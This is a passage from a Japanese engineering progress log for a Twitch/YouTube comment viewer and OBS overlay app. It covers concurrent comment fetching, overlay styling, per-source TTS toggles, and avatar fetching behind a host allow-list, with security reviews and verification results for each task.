- 検証: `typecheck`/`lint`＝0 error・`OverlayComment.module.css` の生 hex/rgba なし（grep）。**残課題（実機）**: tauri dev で ①吹き出しが
  近白 ②名前が折り返さず別行 ③サイト名ピルが名前の横 ④しっぽがアイコン方向 ⑤本体不変 ⑥OBS 透過合成維持、を目視。近白の濃度/しっぽ
  位置/文字サイズは実機微調整。

### さらに微調整（本人フィードバック2）

- **しっぽを長く＋透け解消（不透明化で一体化）**: 半透過（`#ffffff 90%`）だとしっぽと吹き出しの重なりで不透明度が二重に乗り「吹き出しの
  下にしっぽが透けて見える」ため、`--overlay-bubble-bg` を**不透明のほぼ純白**（記述時 `#fafafa`・最終コミット値は `#f0f1f3`＝目視調整の初期値）に変更。しっぽは clip-path 単一三角 → **border 三角の
  2 枚重ね（外＝枠色 `::before`／内＝塗り色 `::after`）**に変更し、塗り三角を本体へ +2px 重ねて継ぎ目を隠す（不透明なので継ぎ目なく一体化）。
  長さは ≒10px → ≒20px に延長。位置/長さは tauri dev で微調整前提。
- **アイコンの枠を削除**: `.icon` の `border` と未使用化した `--overlay-icon-border` トークンを削除（グレー丸のみ）。
- **吹き出しの枠を太く**: `.bubble` の border を `1px` → `2.5px`（`--overlay-bubble-border` を `#0a0a0a 16%` にわずかに強め）。
- 変更ファイル: `OverlayComment.module.css`（しっぽ 2 枚三角・枠太め・アイコン枠削除）・`theme.css`（bubble 不透明化・border 強め・
  icon-border トークン削除）。`CommentList.tsx` は変更なし。検証: `typecheck`/`lint`＝0 error・生 hex/rgba なし（grep）・トークン未定義参照なし。

## 2026-07-20 (035a sidecar 取得セッション排他を provider 別化＝Twitch/YouTube 同時取得の解禁)

### 完了したこと

- sidecar の**単一セッション排他**（片方の取得開始が他方を abort）を **provider 別**に分離し、**Twitch と YouTube を同時取得**できるようにした。
  取得コメントは既存 `comments.append`（`source` 別）で流れ、**下流のマージ/表示（`mergeComments.ts`・`CommentList.tsx`）は無改修**で両者が 1 リストに並ぶ。
  変更は **sidecar のセッション管理のみ**で、宛先・二層 fail-closed・no-internet 境界は不変。

### provider 別セッション化の diff 要点（`apps/comment-sidecar/src/index.ts`）

- 単一 `let sessionAbort` / `let activeSessionPlatform` を廃し、**`const sessionAborts = new Map<Provider, AbortController>()`** へ置換。
- `startSession`（twitch）/`startYouTubeSession`（youtube）は**自 provider の既存セッションのみ** `get(provider)?.abort()` → `set(provider, abort)`
  （他 provider は温存＝並行取得を維持）。`finally` は**自分が現在の entry の時だけ** `if (sessionAborts.get(provider) === abort) delete`（再開始レース回避）。
  パイプラインへ渡す `signal` は自 provider の `abort.signal`（現行どおり）。
- `stop-session` は `activeSessionPlatform` 分岐を除去し、**該当 provider のみ** `get(frame.service)?.abort()` + `delete`（他 provider は継続）。停止後は該当 provider を `session.state = idle`。
- `shutdown`（no-orphan / SIGTERM / SIGINT / stdin close）は `for (const abort of sessionAborts.values()) abort.abort()` で**全 provider を停止**（止め残さない）。
- `sessionAbort`/`activeSessionPlatform` の参照はこの 1 ファイルに閉じていた（全リポ grep 済み・他ファイル/フロント/Rust は無参照）。**新規依存ゼロ**（組込 `Map`・SEA 禁止依存ゲート通過）。

### security.md 方針反転の差分・並行 egress/クォータ留意

- 「## コメントビューア（配信サービス連携）方針」冒頭を **「Twitch と YouTube は併存し各サービス個別選択（同時取得・マージ表示はしない）」→
  「…同時取得・マージ表示する（provider 別セッションで並行取得。035a で反転）」** に更新。
- **⑨（035a）並行 egress・リソース留意**を追記: 両稼働時は既存 allow-list 宛先へ**並行に egress**（新規宛先は増やさない）／YouTube は
  **両稼働でクォータ（10,000 units/日）消費が早まる**（枯渇時は⑧ graceful stop で通知）／CPU/メモリ/ソケットも 2 セッション分。UI 保護は 035c。
  - **訂正（2026-07-20）**: ⑨ の「両稼働でクォータ消費が早まる」は誤り。YouTube クォータの消費源は YouTube Data API のみで、
    **Twitch 併走（EventSub WS＝別勘定）は YouTube クォータに影響しない**。security.md ⑨ を「消費は Twitch 併走の影響を受けない」へ訂正済み。
    併せて 035c は「TTS ソース別読み上げフィルタ」のみに縮小し、**クォータ保護・警告 UI を除外**した（枯渇時 graceful stop は 032c-d 既実装・
    片方停止の見せ方は 035b が担当）。詳細は `docs/tasks/035c-tts-source-filter.md` の「スコープ変更」注記を参照。
- 032c 系の追随: 032c-d 完了記録（security.md）・032c-b/032c-d task doc の「やらないこと」該当行に**前方参照**（「035a/035 で同時取得を解禁」）を追記（当時スコープの記録本体は据え置き）。

### security-review 結果

- **判定＝問題なし（修正必須なし）**。確認: ①新規宛先ゼロ（既存 allow-list への並行接続のみ）②host-guard/gRPC ガード/env ピン留めのロジック不変
  ③main/Rust の no-internet・loopback WS 境界不変（`src-tauri`/capabilities/`tauri.conf.json` に差分 0）④token/device_code 非ログ維持
  ⑤security.md 文言が実装（同時取得する）と一致し並行 egress/クォータ留意を明記。共有 `outputPort` は意図的マージ先・host-guard はステートレス
  allow-list・gRPC ガードは channel 生成時照合で、同時実行による状態汚染/ガードすり抜けなし。`finally` の `=== abort` ガードで二重 delete/leak も回避。

### 検証結果

- `pnpm --filter ./apps/desktop typecheck`＝0 error／`lint`＝0 error／`build:sidecar`（tsc→esbuild→SEA）成功・「no keyring/hono/dotenv in bundle ✓」。
- 変更ファイル（tracked）: `apps/comment-sidecar/src/index.ts`・`docs/security.md`・`docs/tasks/032c-b-…md`・`docs/tasks/032c-d-…md`（＋本 progress）。

### 未確認（ユーザー環境・実機）

- `pnpm --filter ./apps/desktop tauri dev` で **Twitch 接続 → YouTube も接続 → 両者のコメントが 1 リストに並ぶ／片方 stop で他方継続／終了で両方停止**（実配信＝両プラットフォームのライブが必要）。
- 任意: `lsof -i` で外部 ESTABLISHED が **sidecar PID 下のみ**に出ること（封じ込め不変の実証）。

## 2026-07-20 (035b viewer/overlay 同時表示 検証＋UI 微調整＋動作確認用モック)

### 完了したこと

- 035a（provider 別並行取得）後の**両稼働時の表示**を検証・微調整。表示層は既にマージ対応のため**本体の実コード変更は overlay の
  source 色アクセント 1 点のみ**、他（両接続インジケータ並列・片方 stop の継続）は既存実装で成立を確認。
- 同時配信ができない環境で 3 点を目視するため、**sidecar の env ゲート・モックモード**（`COMMENT_SIDECAR_MOCK=1`）を一時テスト補助として追加。

### 本体の微調整点（純 frontend の表示調整）

- **(2) overlay の source 常時判別**: viewer 本体（`variant="default"`）は `showSource` 非依存で常時バッジ表示済み＝変更不要。overlay
  （`variant="overlay"`）は 034e「サイト名を表示する」トグル（既定 OFF・名前横の色ピル）だけが source 表示だったため、既定で source 不可視だった。
  → **サイト名テキスト/ピルはトグル制御のまま**（034e の意図を壊さない）、**アイコン枠に source 別の色リングを `showSource` 非依存で常時付与**し、
  mixed 表示でも Twitch/YouTube を色で常に判別できるようにした。色は既存 `--overlay-source-twitch-bg`/`--overlay-source-youtube-bg` トークンを
  再利用（新規 hex/トークンなし）。`box-shadow` リングなので 034f の実アイコン差替（background-image）とレイアウトを壊さない。
- **(1) 両接続インジケータ**（`StatusIndicator`・`SettingsView`）は provider 別に独立導出済みで両「取得中」並列表示が成立＝**変更なし**（目視確認のみ）。
- **(3) 片方 stop**: `mergeComments` は source で消さない＋sidecar は該当 provider のみ idle（035a）＝表示済みが残り他方継続＝**変更なし**（目視確認のみ）。
- 変更ファイル（本体・初版）: `CommentList.tsx`（overlay アイコンに `OVERLAY_ICON_SOURCE_CLASS` を常時付与）・`OverlayComment.module.css`
  （`.iconTwitch`/`.iconYoutube` リング）。`csp: null`・新規 command/capability/依存なし・overlay は表示専用（制御フレーム非送信）維持。

### 本人フィードバック（overlay 微調整・初版から変更）

- **アイコンの色リングを撤去**: 本人目視で「アイコン外枠の色（Twitch=紫/YouTube=赤）がノイズ」との指摘。上記(2)で足した
  常時色リング（`.iconTwitch`/`.iconYoutube` ＋ `OVERLAY_ICON_SOURCE_CLASS`）を**削除**し、アイコンは 034e/034f のグレー丸（枠なし）へ戻した。
  → **overlay の source 判別は 034e「サイト名を表示する」トグルの色ピル（opt-in）に戻る**（viewer 本体は従来どおり常時バッジで判別可）。
  overlay で常時 source を出したい場合は、トグル既定 ON か、枠でない控えめな表示（例: 名前の色分け）を別途検討（今回は未実施）。
- **コメント間の余白を追加**: 「詰めすぎ」との指摘で、overlay `.item` の縦 padding を `2px`→`6px` に拡大（共有 `.list` の `gap:6px` は
  default 本体にも波及するため触らず、overlay 専用の `.item` 縦余白のみ増やす）。
- 変更ファイル: `CommentList.tsx`（リング付与を撤去・アイコンは `overlayStyles.icon` のみ）・`OverlayComment.module.css`
  （`.iconTwitch`/`.iconYoutube` 削除・`.item` padding 6px）。**sidecar 無変更＝再ビルド不要**。`typecheck`/`lint`＝0 error・生 hex/rgba 追加なし。

### 動作確認用モック（一時テスト補助・sidecar env ゲート・**既定 OFF・env ゲートのまま維持**）

- **方式**: `COMMENT_SIDECAR_MOCK=1` のときだけ sidecar が**実ネットに出ず**、ユーザーの「接続→取得開始→停止」操作に応じて**既存 WS
  ブロードキャスト経路**へ合成フレーム（`link.state`/`session.state`/`comments.append`・一部 superchat/bits 額つき）を流す。viewer・overlay の
  両窓に同一コメントが届き、3 点（混在表示・両インジケータ並列・片方 stop で他方継続）を end-to-end で目視できる。
- **集約先**: `apps/comment-sidecar/src/dev-mock.ts`（**新規**・`isMockEnabled()` ＋ `createMockCommentSource()`・top-level 副作用ゼロの純関数のみ）。
  `index.ts` は **1 ゲートのみ**（import ＋ 構築 `const mockSource = isMockEnabled() ? create... : null` ＋ handler 先頭の null ガード早期 return
  ＋ shutdown の `mockSource?.stopAll()`）。**OFF（既定）は全て null ガード no-op ＝実取得経路がバイト等価で無改変**。
- **有効化手順**（Rust 無改変・shell plugin 2.3.5 の env 既定継承を利用）:
  1. `TWITCH_CLIENT_ID=… YOUTUBE_CLIENT_ID=… YOUTUBE_CLIENT_SECRET=… pnpm --filter ./apps/desktop build:sidecar`（SEA 再ビルド。runtime は SEA のため必須）
  2. `COMMENT_SIDECAR_MOCK=1 pnpm --filter ./apps/desktop tauri dev` → コメビュ窓で Twitch を「接続→取得開始」、YouTube も「接続→取得開始」。
  - OFF（既定）= env なしで `tauri dev` → 現行どおり実取得。
- **撤去方法**: `dev-mock.ts` を削除し、`index.ts` の import／構築／handler 早期 return 1 行／shutdown 1 行を外すだけ（1 ファイル＋1 ゲート）。
  → 今回は**マージ前撤去はせず env ゲートのまま維持**（既定 OFF・同時配信なしでの回帰目視に再利用可）。

### security-review 結果（軽・モックが sidecar に触れるため）

- **判定＝問題なし（修正必須なし）**。確認: ①既定 OFF（`=="1"` の明示 env 必須）②新規外部宛先ゼロ（合成フレームは既存 loopback WS のみ）
  ③**ON 時にネットに出ない**（`runTwitch/YouTubePipeline`・`authClient.login*` を呼ばない）④fail-closed 不変（host-guard は index.ts:20 で無条件
  インストール・env ピン留め・gRPC ガードは無改変。モックは**ガード対象の実通信呼び出しの手前**で早期 return）⑤新規 env は真偽ゲート
  `COMMENT_SIDECAR_MOCK` のみで**宛先 env override ではない**＝env ピン留めを弱めない ⑥token 非関与・loopback WS に載るのは非機密の
  `{platform,linked}` と合成コメント（偽名/偽本文）・ログは provider 名のみ（本文非ログ）⑦Rust/capability/依存の追加ゼロ・`build:bundle` の
  禁止依存アサート（keyring/hono/dotenv）通過。**後回しメモ**: モックは env ゲート付きで本番 SEA にも同梱されるが、有効化には明示 env が必要で
  ON でも機能低下（合成表示・ネット非送出）に留まり権限昇格/漏洩はない＝低リスク（撤去容易）。

### 検証結果

- `pnpm --filter @stream-dock/comment-sidecar typecheck`＝0 error／`pnpm --filter ./apps/desktop typecheck`＝0 error／`lint`＝0 error。
- `pnpm --filter @stream-dock/comment-sidecar build:bundle`（tsc→esbuild・secret 不要の疎通確認パス）成功・「no keyring/hono/dotenv in bundle ✓」。
  ※ full `build:sidecar`（SEA）は焼き込み secret が必要なゲートで未実行（モック変更とは無関係）。ユーザーが ON 目視時に secret 付きで実施。
- **モック headless e2e**（bundled sidecar を `COMMENT_SIDECAR_MOCK=1` で起動し loopback WS へ制御フレーム送出）で PASS を確認:
  `link.state` 両 linked／`session.state` 両 connecting→connected／`comments.append` 両 source 混在／**twitch stop 後は twitch=0・youtube 継続・
  twitch のみ idle 復帰**／合成コメントが `CanonicalComment` と同形（id/source/author.name/text/publishedAt/eventType）。
- 変更ファイル（tracked）: `apps/comment-sidecar/src/index.ts`・
  `apps/desktop/src/screens/comment-viewer/OverlayComment.module.css`・`apps/comment-sidecar/src/dev-mock.ts`（新規・＋本 progress）。`src-tauri`/capabilities/依存は不変。
  ※ `CommentList.tsx` は色リング撤去で **HEAD に戻り差分ゼロ**（`git diff` 実確認）なので tracked 変更には含めない（上「本人フィードバック」の記述は初版→撤去の経緯記録）。

### 未確認（ユーザー環境・実機）

- ON 目視: `COMMENT_SIDECAR_MOCK=1` ＋ `build:sidecar`（secrets）＋ `tauri dev` で、viewer・overlay の両方で ①両 source が 1 リストに混在・
  バッジ/色リングで判別 ②SettingsView/StatusIndicator の両インジケータが並列に「取得中」③片方 stop で他方継続・停止側のみ idle・表示済み破綻なし。
- OFF 回帰: env なし `tauri dev` で実取得が従来どおり（回帰なし）。任意: `lsof -i` で ON 時に sidecar PID から外部 ESTABLISHED が出ないこと。

## 2026-07-20 (035c TTS ソース別読み上げフィルタ)

- 035a（provider 別並行取得）/035b（同時表示）で **Twitch/YouTube のコメントが 1 リストに混在**して届くようになり、
  現行の `enqueueForSpeech` が **source 問わず**全コメントを VOICEVOX へ流す＝両稼働時に**読み上げが暴発**（詰まる/やかましい）。
  これを **source 別に読み上げ ON/OFF** できるようにして制御した。**既定は両 ON で現行踏襲**・**フィルタは読み上げのみ**
  （表示・一覧・overlay は全 source を従来どおり出す）。スコープ変更（2026-07-20）どおり **クォータ保護 UI/警告は除外**。
- **永続化（既定 true）**: `ttsPrefs.ts` に source 別読み上げ ON/OFF を追加。キー＝`stream-dock.comment-viewer.speak-twitch`
  / `speak-youtube`（既存の名前空間・`String()` 保存・例外握りつぶしを踏襲）。**判定だけ `getItem(KEY) !== "false"` で既定 ON**に
  した（未保存・不正値・例外はすべて true にフォールバック＝現行の全読み上げを壊さない）。`tts-enabled`/`voicevox-autolink`
  （既定 OFF・`=== "true"`）とは**逆**である点をファイル冒頭コメントに明記。追加関数＝`loadSpeakTwitch`/`saveSpeakTwitch`/
  `loadSpeakYoutube`/`saveSpeakYoutube`（既存 2 関数と同形）。
- **per-source フィルタ方式**: `CommentViewerApp.tsx` の `enqueueForSpeech`（単一注入点）で、既存の「VOICEVOX読み上げ ON の
  ときだけ enqueue」ゲート（`ttsEnabledRef`）と**併用**して **`comment.source` が OFF の source を per-comment で除外**（呼び出し
  全体は止めず 1 件ずつ判定＝混在時も片方だけ読み上げる）。`enqueueForSpeech` は安定 `useCallback([])` を保つため、source 別 state は
  `ttsEnabledRef` と同じく **ref 経由**（`speakTwitchRef`/`speakYoutubeRef`）で参照し、WS 接続 effect の張り直し（「窓内 1 本」
  原則）を崩さない。**表示は `mergeComments` の `next` を不変で `setComments` に渡す**（絞りは enqueue 側だけ）。OFF の source の
  コメントは `ttsQueue` の `seenIds` に載らないため、後で ON にしても遡って読み上げない（`ttsEnabled` OFF 時と同じ期待挙動）。
- **SettingsView トグル**: 「読み上げ（VOICEVOX）」カードに「Twitch を読み上げる」「YouTube を読み上げる」トグルを追加。
  **VOICEVOX 読み上げ本体が OFF（`ttsEnabled=false`）のときは両トグルを `disabled`（グレーアウト）**にする（読み上げトグル本体は
  本体ビューのツールバーにあり、設定ビューは `ttsEnabled` を受け取って無効表示するだけ）。`ToggleSwitch` に最小の `disabled?` prop
  を追加（button 無効化＋行 dim。既存の利用箇所＝読み上げ・自動連携・オーバーレイは未指定で挙動不変）。CSS は `.toggleRowDisabled`
  （opacity）＋ `.switch:disabled`（not-allowed）を役割トークンのみで追加。
- **レイアウト修正（潜在バグ是正）**: source トグル追加で読み上げカードの高さが増え、設定画面のカードがはみ出す/他カードの高さも
  崩れる不具合が顕在化。原因＝`.card`（`overflow:hidden`）は flex 自動最小高さが 0 になり、内容が窓を超えると `.settingsView`
  （flex column・`overflow-y:auto`）が全カードを縮めて `overflow:hidden` でクリップしていた（=親がスクロールしない）。
  `.card`／`.settingsHeader` に `flex-shrink: 0` を足し、はみ出す分を `.settingsView` 側で縦スクロールさせる形に是正
  （`overflow:hidden` は cardHead の角丸クリップに必要なので温存。`.connGrid` の水平 grid は縦 flex-shrink と無関係で不変）。
- **security-review 結果（軽）＝問題なし（修正必須なし）**。frontend の設定/表示追加のみ（localStorage の bool 2 キー・enqueue の
  per-comment 分岐・トグル UI）。**外部通信宛先・API・capability・依存を追加せず**（Rust 変更ゼロ）・`csp: null` 不変・VOICEVOX の
  loopback 例外（`127.0.0.1:50021`）を広げていない（OFF の source は `synthesize` へ送らない＝送信は減る方向）。**コメント本文の
  ログ/DB 出力は追加なし**（enqueue 経路・ttsQueue 不変）。§⑨（035a・security.md）が「source 別 ON/OFF は 035c で扱う」と予定して
  いた範囲内。
- **検証結果**: `pnpm --filter ./apps/desktop typecheck`＝0 error／`lint`＝0 error。`git diff --stat`＝frontend 5 ファイルのみ
  （`ttsPrefs.ts`・`CommentViewerApp.tsx`・`SettingsView.tsx`・`ToggleSwitch.tsx`・`CommentViewerApp.module.css`）で
  `src-tauri`/capabilities/依存は不変。
- **未確認（ユーザー環境・実機）**: 両接続（実配信 or 035b のモック）で source 別読み上げトグルを操作 → 片方 OFF でその source は
  読み上げされない・表示は残る／既定 両 ON で現行どおり全読み上げ／VOICEVOX 読み上げ OFF 時は source トグルが disabled／再起動後も
  トグル状態が保持される。
- **035 系（035a〜c）完了**: 035a（sidecar 同時取得の解禁）→035b（viewer/overlay 同時表示 検証・微調整・動作確認モック）→
  035c（TTS source 別読み上げフィルタ）で、親 035「YouTube/Twitch 同時取得・マージ表示・読み上げ制御」が一通り揃った。

## 2026-07-21 (036a アバター ワイヤ契約拡張＋オーバーレイ描画（受け側）)

- 親 036「OBS オーバーレイへ実ユーザーアイコン（data URI）表示」の**受け側だけを先行導入**。投稿者アイコン（data URI）を
  **受け取って描画する配管と表示**を通した。**送り側（036b/036c）が未実装なので `avatar` は常に空**で、見た目は現状（グレー丸）から
  実質変わらない＝無害に先行できる。**実際の画像取得・URL 解決・URL→data URI 変換は本タスクでは書かない**（036b/036c の領分）。
- **ワイヤ契約に任意 `avatar` を全層追加（層別の意味づけを混同しない）**。ts-rs のワイヤ契約が正:
  - ドメイン `User`（comment-fetcher `user.ts`）`avatar?: string`＝**取得元の画像 URL**（純ドメイン値・036b/c が埋める）。
  - 配信 DTO `UserSummaryDto`（shared）／Rust ワイヤ契約 `CommentAuthor`（`model.rs`・`#[ts(optional)] Option<String>`＝既存
    `monetary_amount` と同型）`avatar?`＝**data URI**（webview が `<img>`/`background-image` にそのまま使える形）。
  - converter（`comment-to-view.converter.ts`）は `avatar: comment.author.avatar` を**素通し**（036a では `User.avatar` を誰も
    埋めないため常に `undefined`）。**URL→data URI 変換は書かず**、「036b がこの行を変換に差し替える egress 集約の境界」である旨を
    コメントで明示。
- **bindings 再生成**: `pnpm --filter ./apps/desktop gen:bindings`（＝`cargo test export_bindings`）で `CommentAuthor.ts` を再生成
  （`{ id, name, avatar?: string }`・手編集なし）。drift ゼロ（再実行で追加差分なし）。
- **オーバーレイ描画分岐＋フォールバック（ユーザー確定＝名前イニシャル）**: `CommentList.tsx` の `renderOverlayItem` を、
  `c.author.avatar` があれば既存 `.icon` 枠に `background-image: url("<data URI>")` で差し（`background-size:cover` は準備済み・
  新規 `<img>` 要素も新規 CSS も不要）、無ければ**グレー丸＋名前の頭文字**にフォールバック（`authorInitial` を comment-viewer 内に
  equivalent で持つ＝`features/tools` の `toIconLetter` は別系統なので import しない）。CSS は `.icon` に中央寄せ（flex）を足し、
  新規 `.iconFallback`（`--overlay-name-fg` トークン再利用・生 hex 追加なし）を追加。`aria-hidden` は名前が上段テキストで既出のため
  据え置き（二重読み上げ回避）。
- **security-review 結果（軽）＝問題なし（修正必須なし）**。frontend の表示追加＋ワイヤ契約フィールド追加のみで、**外部通信宛先・
  API・capability・依存を追加せず**・`csp: null` 不変。`<img>`/`background-image` が踏むのは **data URI のみ**（036a では常に空＝
  外部 URL を一切踏まない）。**コメント本文/画像を Rust の DB/ログに出す経路は追加なし**（`CommentAuthor` はスキーマ専用 DTO で
  Rust に構築経路なし）。申し送り（036b・security-review 必須）＝converter の URL→data URI 変換出力が well-formed data URI である
  こと・変換を converter 1 箇所に集約し webview に raw URL を渡さないこと。
- **検証結果**: `pnpm --filter ./apps/desktop typecheck`＝0 error／`lint`＝0 error。`cargo check`＝OK（bindings 再生成後の整合）。
  `gen:bindings` 再実行で `CommentAuthor.ts` の追加差分ゼロ（drift なし）。sidecar は `typecheck`＝OK／`build:bundle`（`--bundle-only`）＝
  OK で TS 3 層追加が型・バンドル通過（`build:sea` フルバイナリ焼き込みは配布用 secrets（`TWITCH_CLIENT_ID` 等）が要る既存の環境要件で、
  本 TS 変更とは無関係にその手前で停止）。`git diff --stat`＝7 ファイル（Rust 1・bindings 1・sidecar 3・frontend 2）で capabilities/
  `tauri.conf.json`/依存は不変。
- **未確認（ユーザー環境・実機）**: `pnpm --filter ./apps/desktop tauri dev` で overlay を開き、avatar 空で従来どおり（グレー丸＋
  名前イニシャル）壊れない／ダミー data URI を注入すると枠に画像が出る、を目視。
- **036 系の次**: 036b（sidecar 共通取得基盤＝fetch→縮小→data URI→上限付きキャッシュ＋YouTube アイコン取り込み＋画像 CDN を
  allow-list 追加・**security-review 必須**）→036c（Twitch を Helix `users` で URL 解決・036b 基盤再利用・**security-review 必須**）。

## 2026-07-21 (036b sidecar アバター取得基盤＋YouTube 対応（送り側）)

- 親 036 の**送り側**を YouTube で end-to-end 通した。sidecar に**アバター画像の共通取得基盤**（URL→取得→data URI→上限付き
  キャッシュ）を新設し、YouTube の `authorDetails.profile_image_url`（コメントストリームに載る＝追加 API 呼び出し不要）を取り込んで
  overlay に実アイコンを表示する。取得は**すべて sidecar 内で完結**し data URI で渡すため、**webview 外部通信ゼロ・`csp: null`・
  capabilities・Rust no-internet 不変**。036c（Twitch）は本基盤（`resolveAvatarDataUri`）を再利用する。
- **共通取得基盤 `resolveAvatarDataUri(authorId, url)`（新規 `comment-delivery/.../converters/resolve-avatar-data-uri.ts`）**:
  - **全域関数（never throws）**＝失敗/タイムアウト/超過/非許可ホスト/MIME 不許可/空 URL はすべて `undefined`（→ overlay グレー丸へ
    フォールバック）。active 配信経路は per-comment try/catch を持たないため「throw しない」ことで 1 件失敗のバッチ巻き添えを防ぐ。
  - 取得は起動時に置換済みの **global `fetch`（fail-closed ホストガード経由）**。**リダイレクト追従は `redirect:"error"` で fail-closed 禁止**
    （ガードを迂回した非 allow-list 宛先への egress を防ぐ）。
  - **確定値**: 取得タイムアウト **3s**（`AbortSignal.timeout`）／画像バイト上限 **128KB**（Content-Length 事前チェック＋**ストリーム実測で
    超過時 `reader.cancel()`**）／MIME 許可 **png/jpeg/webp/gif**／正キャッシュ **LRU 500 authors**／負キャッシュ **TTL 5分・cap 500**／
    **in-flight 重複排除**（同一投稿者の同時 fetch を 1 本に集約）。キャッシュは**投稿者 ID 単位・メモリ内・非永続**。
  - **出力整形＋検証（egress 集約点の責務）**: `data:${mime};base64,${b64}` を `Buffer.toString("base64")` で組み、emit 前に
    `^data:image/(png|jpeg|webp|gif);base64,…$` の正規表現ゲートを通す（overlay の `background-image: url("…")` で外部 URL ブレイクアウト
    させない）。
- **縮小方式＝依存ゼロ（§10）**: gRPC リクエストに既存の `profile_image_size`（現状未設定）を **48** で設定し、YouTube CDN から
  小サイズ URL を受け取る＝**クライアント側デコード/リサイズ不要**。`fetch` + 標準 `Buffer` base64 のみで **新規依存なし**
  （sharp/canvas=native は §10 の pure-JS 方針に反し不採用、jimp=pure-JS も CDN 縮小で不要）。想定外サイズはバイト上限で sidecar 内遮断。
- **converter へ変換集約＋async 化**（036a の申し送りを実処理化）: `comment-to-view.converter.ts` を async 化し
  `avatar: await resolveAvatarDataUri(author.id, author.avatar)` に。呼び出し口 2 か所（active＝`src/index.ts` の `Promise.all`＋順序保持
  broadcast／vendor usecase＝`await Promise.all`）を最小差分で更新。
- **【036a の穴埋め】wire 配管**: active 配信経路の実ペイロード型 `CanonicalCommentAuthor`（`src/wire.ts`）が `{id,name}` のみで
  `avatar` を落としていた（036a は `UserSummaryDto`/converter まで通したが wire 型は未対応）。`CanonicalCommentAuthor.avatar?` を追加し
  `toCanonicalComment` で受け渡し。これで data URI が webview に届く（受け側 `CommentList.tsx:107` は 036a で対応済み）。
- **YouTube URL 取り込み（proto/DTO/mapper）**: proto レスポンス `LiveChatMessageAuthorDetails` に `profile_image_url` 追加／
  request に `profile_image_size: 48`／生 DTO `YouTubeLiveChatAuthorDetailsDto.profile_image_url?`／mapper で `author.avatar = profile_image_url`。
  - **⚠ proto フィールド番号は未確定（要実レスポンス検証）**: 参照元の osareview 正 proto にも本フィールドが無く（osareview はアバター
    未取得・`profile_image_size` も未設定）逐語コピー元が存在しないため、`display_name=103` に隣接する reverse-engineered 値 **104** を暫定採用。
    **番号が実スキーマと異なる場合は avatar が空のまま＝グレー丸でクラッシュせず**。実配信で author_details を一度確認し確定する。
- **追加 egress を allow-list 明示追加（host-guard.ts）**: **HTTPS 専用ワイルドカード** `ALLOWED_HTTPS_WILDCARD_SUFFIXES=[".ggpht.com",
  ".googleusercontent.com"]` を新設（`isAllowedHttpsHost`）。**WS/gRPC には広げない**（`isAllowedWssHost` は `*.wss.twitch.tv` のみ・gRPC は
  `www.googleapis.com:443` のみのまま＝最狭を維持）。先頭ドット suffix で真のサブドメインのみ許可し `ggpht.com.evil.com`/`evil-ggpht.com` は
  throw。env ピン留め・gRPC チャネルガードは不変。**⚠ CDN ホストは実レスポンスで最終確定**（両ホストとも Google 所有で暫定両登録）。
  - `scripts/test-host-guard.mjs` に許可（`yt3.ggpht.com`/`lh3.googleusercontent.com`）＋拒否（偽装/非https/WS/gRPC）ケースを追加。
    **全 33 ケース PASS**（`node scripts/test-host-guard.mjs`＝`HOST-GUARD PASS`）。
- **docs/security.md 更新（host-guard.ts と一致）**: 「コメントビューア方針」に **⑩（036b・アバター画像取得）** を追記（追加宛先＝
  `*.ggpht.com`/`*.googleusercontent.com`・HTTPS のみ・WS/gRPC 不変／sidecar 内完結・data URI・webview/CSP/capabilities/no-internet 不変／
  キャッシュ上限・非永続・DB/ログ非出力・§9／タイムアウト/バイト上限/MIME/`profile_image_size`／新規依存なし）。§1 に 036b 追補、§10 に
  「036b＝新規依存なし」を併記。host-guard.ts ヘッダの許可宛先一覧も同期。
- **security-review 結果＝問題なし（修正必須なし）**。観点確認: 追加宛先が allow-list に明示追加され外は throw（test で固定・
  `redirect:"error"` でリダイレクト迂回も遮断）／画像取得が sidecar 内で完結し webview/CSP/capabilities/Rust no-internet 不変／
  キャッシュ上限・タイムアウト・バイト上限・失敗時 undefined／data URI・URL を DB/ログに出さない・キャッシュ非永続／
  env ピン留め・gRPC チャネルガードのロジック不変／新規依存なし／host-guard.ts と security.md の allow-list 一致。後回し改善＝将来 CDN
  正規リダイレクト時は `redirect:"manual"`＋Location host 再検証、バッチ内並行 fetch の同時実行数リミッタ（現状 timeout/byte-cap/in-flight で緩和）。
- **検証結果**: `pnpm --filter ./apps/comment-sidecar typecheck`＝0 error／`build:tsc`＝OK。`node apps/comment-sidecar/scripts/test-host-guard.mjs`
  ＝HOST-GUARD PASS（33/33）。`pnpm --filter ./apps/desktop typecheck`＝0／`lint`＝0。`git diff --stat`＝11 ファイル（sidecar TS 10＋docs 1）＋
  新規 util 1 で、**package.json（依存）・capabilities・tauri.conf.json・Rust は不変**。dist は gitignored（成果物リークなし）。
  ※`pnpm --filter ./apps/comment-sidecar lint` は sidecar に lint script が無く実行不可（036a と同様・sidecar の品質ゲートは typecheck＋host-guard test）。
  ※`build:sea` フルバイナリは配布用 secrets が要る既存の環境要件のため未実行（本 TS/proto 変更とは無関係）。
- **未確認（ユーザー環境・実機）**: `pnpm --filter ./apps/desktop tauri dev` で YouTube 実配信（実 OAuth）につなぎ、overlay に実アイコン表示／
  取得失敗時グレー丸フォールバック／同一投稿者の重複 fetch 抑制（sidecar ログ）を目視。あわせて **proto フィールド番号 104 と CDN ホストを
  実レスポンスで最終確定**（誤っていてもグレー丸で無害）。
- **036 系の次**: 036c（Twitch アイコンを Helix `users` で URL 解決＝chat イベントに無い・036b の `resolveAvatarDataUri` を再利用・Twitch
  アバター CDN `*.jtvnw.net` を host-guard/security.md に追記・**security-review 必須**）。

## 2026-07-21 (036c sidecar アバター取得 Twitch 対応（Helix users）)

- 親 036 の**送り側を Twitch でも通した**。Twitch の EventSub chat イベントには**アバター URL が載らない**ため、投稿者 ID を
  **Helix `GET /users` で照会して `profile_image_url` を解決**し、036b の共通取得基盤（`resolveAvatarDataUri`）を再利用して data URI 化。
  取得・解決は**すべて sidecar 内**に閉じ、webview には data URI のみを渡す（**webview/CSP/capabilities/main・Rust の no-internet 不変**）。
  これで **036 系（036a〜c）が完了**。
- **Helix `users` バッチ照会（重複排除・≤100件/回）**: `TwitchUserDto` に `profile_image_url` を追加（`raw.dto.ts`）。`helix.client.ts` に
  `getUserProfileImagesByIds(ids): Promise<Map<id,url>>` を新設＝`new Set` で重複排除＋`HELIX_USERS_BATCH_LIMIT=100` 件チャンク＋
  `URLSearchParams` に `id` を反復 append（`/users?id=A&id=B...`）。既存の `request`/`requestWithAccessToken`（token 取得・401 リトライ）を
  そのまま利用し、宛先 `api.twitch.tv` は 032c-b で allow-list 済み＝**既存宛先内の照会追加・宛先は増えない**。`resolveUserIdByLogin`/
